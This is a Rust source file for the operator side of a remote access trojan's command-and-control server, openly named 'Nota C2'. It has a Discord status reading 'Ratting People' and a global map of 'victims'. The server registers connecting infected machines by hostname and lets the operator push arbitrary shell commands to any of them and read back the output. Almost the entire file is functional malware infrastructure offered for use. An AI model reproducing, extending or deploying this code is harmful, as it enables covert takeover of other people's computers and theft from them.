#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use std::net::{TcpListener, TcpStream};
use lazy_static::lazy_static;
use std::sync::{Mutex};
use std::collections::HashMap;
use std::{thread, time};
use std::io::{Read, Write};
use std::io::{self, BufRead};
use std::process::Command;
use discord_rich_presence::{activity, DiscordIpc, DiscordIpcClient};
use discord_rich_presence::activity::{Assets, Button, Timestamps};



lazy_static! {
    static ref LIST_OF_VICTIMS: Mutex<HashMap<String, TcpStream>> = Mutex::new(HashMap::new());
}


fn main() {
    let mut buttons = Vec::new();
    
    let start_time = time::SystemTime::now()
    .duration_since(time::UNIX_EPOCH)
    .expect("Failed to get timestamp")
    .as_millis() as i64;

    let mut client = DiscordIpcClient::new("1107196462313517078").expect("Could not connect to Discord client");
    client.connect().expect("Could not connect to Discord client");

    buttons.push(Button::new("Github", "https://github.com/fluffydolphin/Nota-C2"));

    let payload = activity::Activity::new().assets(Assets::new().large_image("nota-c2").large_text("Nota C2")).buttons(buttons).details("Ratting People").state("With Nota C2").timestamps(Timestamps::new().start(start_time));
    client.set_activity(payload).expect("Could not connect to Discord client");
    
    thread::spawn(move || {
        starts();
    });
    tauri::Builder::default()
        .invoke_handler(tauri::generate_handler![jsgetinfo])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}

fn starts() {
    let listener = TcpListener::bind("127.0.0.1:421").unwrap();
    thread::spawn(move || {
        new_connection(listener);
    });
    loop {
        let stdin = io::stdin();
        let mut buffer = String::new();

         print!("\n[console] > ");
        io::stdout().flush().unwrap();

        stdin.lock().read_line(&mut buffer).unwrap();
        let command = buffer.trim();

        if command == "exit" || command == "q" || command == "quit" {
            exit_main();
        }
        else if command.contains("connect") {
            let hostname = command.split_whitespace().nth(1);
            main_while(hostname.unwrap());
        }
    }  
}

fn new_connection(listener: TcpListener) {
    loop {
        for stream in listener.incoming() {
            match stream {
                Ok(mut stream) => {
                    let mut buffer = [0; 1024];
                    let n = stream.read(&mut buffer).unwrap();
                    let hostname = String::from_utf8_lossy(&buffer[..n]).to_string();
                    let mut victims = LIST_OF_VICTIMS.lock().unwrap();
                    victims.insert(hostname, stream);
                    drop(victims); 
                }
                Err(e) => {
                    println!("Error accepting connection: {}", e);
                }
            }
        }

    }
}

fn exit_main() {
    let stdin = io::stdin();
    let mut buffer = String::new();

    print!("\nAre you sure you want to exit (y/n)? ");
    io::stdout().flush().unwrap();

    stdin.lock().read_line(&mut buffer).unwrap();
    let mut exit_choice = buffer.trim();

    while exit_choice != "y" && exit_choice != "n" {
        println!("\nfailed (y/n)");

        buffer.clear();
        print!("\nAre you sure you want to exit (y/n)? ");
        io::stdout().flush().unwrap();

        stdin.lock().read_line(&mut buffer).unwrap();
        exit_choice = buffer.trim();
    }
    if exit_choice == "y" {
        for victim in LIST_OF_VICTIMS.lock().unwrap().iter() {
            let mut stream = victim.1;
            stream.write(b"exit").unwrap();
        }
        //drop(listener);
        println!("\nexited\n");
        std::process::exit(0);
    }
    else if exit_choice == "n" {
        return;
    }
}

fn main_while(hostname: &str) {
    let victims = LIST_OF_VICTIMS.lock().unwrap();
    if !victims.contains_key(hostname) {
        println!("Please enter a vailed hostname\n");
        return;
    }
    drop(victims);

    loop {
        let stdin = io::stdin();
        let mut buffer = String::new();

        print!("\n{} $> ", hostname);
        io::stdout().flush().unwrap();

        stdin.lock().read_line(&mut buffer).unwrap();
        let send_command = buffer.trim();

        if send_command == "exit" || send_command == "q" || send_command == "quit" {
            if ! exit_tm() {
                break;
            }
        }

        else if send_command == "clear" {
            clear_tm();
        }

        else if send_command.trim() == "" {
            continue;
        }

        else {
            let victims = LIST_OF_VICTIMS.lock().unwrap();
            let mut client_socket = victims.get(hostname).unwrap();
            client_socket.write_all(String::from(send_command).as_bytes()).unwrap();
            let mut buffer = [0; 1024];
            let n = client_socket.read(&mut buffer).unwrap();
            let output = String::from_utf8_lossy(&buffer[..n]).to_string();
            println!("{}", output);
            drop(victims);
        }
    }
}

fn exit_tm() -> bool{
    let stdin = io::stdin();
    let mut buffer = String::new();

    print!("\nAre you sure you want to exit (y/n)? ");
    io::stdout().flush().unwrap();

    stdin.lock().read_line(&mut buffer).unwrap();
    let mut exit_choice = buffer.trim();

    while exit_choice != "y" && exit_choice != "n" {
        println!("\nfailed (y/n)");

        buffer.clear();
        print!("\nAre you sure you want to exit (y/n)? ");
        io::stdout().flush().unwrap();

        stdin.lock().read_line(&mut buffer).unwrap();
        exit_choice = buffer.trim();
    }
    if exit_choice == "y" {
        println!("\nexited\n");
        return false;
    }
    return true
}

fn clear_tm() {
    if cfg!(windows) {
        Command::new("cmd")
                .args(&["/C", "cls"])
                .status()
                .expect("failed to execute process");
    } else {
        Command::new("clear")
                .status()
                .expect("failed to execute process");
    }
}

#[tauri::command]
fn jsgetinfo() -> Vec<String> {
    let victims = LIST_OF_VICTIMS.lock().unwrap();
    let mut vec: Vec<String> = Vec::new();

    for key in victims.keys() {
        vec.push(key.to_string());
    }
    return vec;
}